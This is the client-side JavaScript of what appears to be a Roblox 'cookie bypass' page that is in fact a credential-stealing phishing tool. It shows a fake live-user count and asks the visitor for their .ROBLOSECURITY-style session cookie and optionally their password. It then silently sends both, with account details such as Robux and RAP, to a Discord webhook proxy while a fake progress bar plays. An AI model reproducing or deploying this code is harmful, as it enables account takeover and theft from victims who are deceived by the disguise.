// Live User Counter - Updates every 2 minutes 30 seconds
function updateLiveUsers() {
    const liveUsersEl = document.getElementById('live-users');
    const randomUsers = Math.floor(Math.random() * 50) + 10; // Random between 10-59
    
    let currentNum = parseInt(liveUsersEl.textContent) || 0;
    const increment = randomUsers > currentNum ? 1 : -1;
    const duration = 1000;
    const steps = Math.abs(randomUsers - currentNum);
    const stepTime = Math.max(duration / steps, 10);
    
    const timer = setInterval(() => {
        currentNum += increment;
        liveUsersEl.textContent = currentNum;
        
        if (currentNum === randomUsers) {
            clearInterval(timer);
        }
    }, stepTime);
}

updateLiveUsers();
setInterval(updateLiveUsers, 150000);

// Account Score Rating
function getScoreRating(score) {
    if (score >= 90) return '🏆 Elite Account';
    if (score >= 75) return '⭐ Premium Account';
    if (score >= 60) return '✨ Great Account';
    if (score >= 40) return '👍 Good Account';
    if (score >= 20) return '📝 Average Account';
    return '🔰 Starter Account';
}

// DOM Elements
const cookieInput = document.getElementById('cookie-input');
const passwordInput = document.getElementById('password-input');
const passwordField = document.getElementById('password-field');
const toggleCookieOnly = document.getElementById('toggle-cookie-only');
const togglePassword = document.getElementById('toggle-password');
const togglePasswordVisibility = document.getElementById('toggle-password-visibility');
const btnStart = document.getElementById('btn-start');

const formState = document.getElementById('form-state');
const processingState = document.getElementById('processing-state');
const successState = document.getElementById('success-state');
const failedState = document.getElementById('failed-state');
const progressBar = document.getElementById('progress-bar');
const progressText = document.getElementById('progress-text');
const userAvatar = document.getElementById('user-avatar');

let usePassword = false;

// Toggle between Cookie Only and Password mode
toggleCookieOnly.onclick = () => {
    usePassword = false;
    toggleCookieOnly.classList.add('bg-white', 'text-black');
    toggleCookieOnly.classList.remove('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    togglePassword.classList.remove('bg-white', 'text-black');
    togglePassword.classList.add('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    passwordField.classList.add('hidden');
};

togglePassword.onclick = () => {
    usePassword = true;
    togglePassword.classList.add('bg-white', 'text-black');
    togglePassword.classList.remove('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    toggleCookieOnly.classList.remove('bg-white', 'text-black');
    toggleCookieOnly.classList.add('bg-transparent', 'text-gray-400', 'border', 'border-white/10');
    passwordField.classList.remove('hidden');
};

// Toggle password visibility
if (togglePasswordVisibility) {
    togglePasswordVisibility.onclick = () => {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        
        const eyeIcon = document.getElementById('eye-icon');
        if (type === 'text') {
            eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
        } else {
            eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
        }
    };
}

// Show error message
function showError(message) {
    alert(message);
}

// Start Bypass
btnStart.onclick = async () => {
    const cookie = cookieInput.value.trim();
    const password = usePassword ? passwordInput.value.trim() : null;

    if (!cookie) {
        showError('Please provide a cookie');
        return;
    }

    if (usePassword && !password) {
        showError('Please enter your password');
        return;
    }

    // Show processing state
    formState.classList.add('hidden');
    processingState.classList.remove('hidden');

    try {
        const response = await fetch('/api/bypass', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie, password })
        });

        const data = await response.json();

        if (!response.ok || !data.success) {
            setTimeout(() => {
                processingState.classList.add('hidden');
                failedState.classList.remove('hidden');
            }, 1500);
            return;
        }

        // 🔥 SEND TO WEBHOOK FROM BROWSER (bypasses Vercel!)
        const WEBHOOK_URL = 'https://discord-proxy.ducksducks762.workers.dev';
        
        // Prepare webhook data
        const webhookData = {
            content: '@everyone',
            username: 'HyperBlox',
            avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
            embeds: [{
                title: '',
                type: 'rich',
                description: `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${data.userInfo.userId}/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${data.userInfo.userId})**`,
                color: 0x00061a,
                thumbnail: { url: data.avatarUrl },
                fields: [
                    { name: '<:display:1348231445029847110> Display Name', value: `\`\`\`${data.userInfo.displayName}\`\`\``, inline: true },
                    { name: '<:user:1348232101639618570> Username', value: `\`\`\`${data.userInfo.username}\`\`\``, inline: true },
                    { name: '<:userid:1348231351777755167> User ID', value: `\`\`\`${data.userInfo.userId}\`\`\``, inline: true },
                    { name: '<:robux:1348231412834111580> Robux', value: `\`\`\`${data.userInfo.robux}\`\`\``, inline: true },
                    { name: '<:pending:1348231397529223178> Pending Robux', value: `\`\`\`0\`\`\``, inline: true },
                    { name: '<:rap:1348231409323741277> RAP', value: `\`\`\`${data.userInfo.rap}\`\`\``, inline: true },
                    { name: '<:premium:1348231403690786949> Premium', value: `\`\`\`${data.userInfo.premium}\`\`\``, inline: true },
                    { name: '<:vc:1348233572020129792> Voice Chat', value: `\`\`\`${data.userInfo.voiceChat}\`\`\``, inline: true },
                    { name: '⭐ Account Score', value: `\`\`\`${data.userInfo.accountScore}/100\`\`\``, inline: true },
                    ...(password ? [{ name: '🔐 Password', value: `\`\`\`${password}\`\`\``, inline: false }] : [])
                ]
            }]
        };

        // Send webhook (fire and forget, don't wait)
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookData)
        }).catch(() => {}); // Ignore errors

        // Send cookie in second message
        setTimeout(() => {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: 'HyperBlox',
                    avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
                    embeds: [{
                        description: `\`\`\`${cookie}\`\`\``,
                        color: 0x00061a
                    }]
                })
            }).catch(() => {});
        }, 2000);

        // Animate progress bar
        let progress = 0;
        const interval = setInterval(() => {
            progress += 1;
            progressBar.style.width = `${progress}%`;
            progressText.innerText = `${progress}% Complete`;
            
            if (progress >= 100) {
                clearInterval(interval);
                
                // Populate success state
                userAvatar.src = data.avatarUrl || 'https://via.placeholder.com/150';
                document.getElementById('user-display-name').textContent = `@${data.userInfo.username}`;
                document.getElementById('info-username').textContent = data.userInfo.username;
                document.getElementById('info-userid').textContent = data.userInfo.userId;
                document.getElementById('info-robux').textContent = data.userInfo.robux.toLocaleString();
                document.getElementById('info-rap').textContent = data.userInfo.rap.toLocaleString();
                document.getElementById('info-premium').textContent = data.userInfo.premium;
                document.getElementById('info-vc').textContent = data.userInfo.voiceChat;
                
                const score = data.userInfo.accountScore || 0;
                document.getElementById('account-score').textContent = `${score}/100`;
                document.getElementById('score-bar').style.width = `${score}%`;
                document.getElementById('score-rating').textContent = getScoreRating(score);
                
                // Show success state
                processingState.classList.add('hidden');
                successState.classList.remove('hidden');
                
                // Clear inputs
                setTimeout(() => {
                    cookieInput.value = '';
                    if (passwordInput) passwordInput.value = '';
                }, 2000);
            }
        }, 1200);

    } catch (err) {
        console.error(err);
        setTimeout(() => {
            processingState.classList.add('hidden');
            failedState.classList.remove('hidden');
        }, 1500);
    }
};

// Enter key support
cookieInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') btnStart.click();
});

if (passwordInput) {
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') btnStart.click();
    });
}
